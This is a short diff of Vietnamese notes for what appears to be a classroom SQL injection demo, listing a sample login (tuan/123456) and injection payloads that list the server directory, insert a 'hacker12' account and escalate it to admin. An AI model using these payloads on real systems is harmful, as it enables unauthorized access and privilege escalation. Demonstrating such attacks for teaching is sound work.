@@ -1,7 +1,9 @@
 1. Demo normal payload:
-    - dùng các account có sẵn trong database
+    - dùng các account có sẵn trong database:
+        + username : tuan
+        + password : 123456
 2. Demo SQLi payload:
-    - nhìn đường dẫn root
+    - nhìn đường dẫn root : ¿'; ls; #
     - tác động database:
         1. tạo 1 account : ¿'; INSERT INTO users (username, password, role, email) VALUES ('hacker12', 'pwned', 'users', 'hacker12@fcode.org'); --
         2. đổi role của account = 'admin' : ¿'; UPDATE users SET role = 'admin' WHERE username = 'hacker12'; --
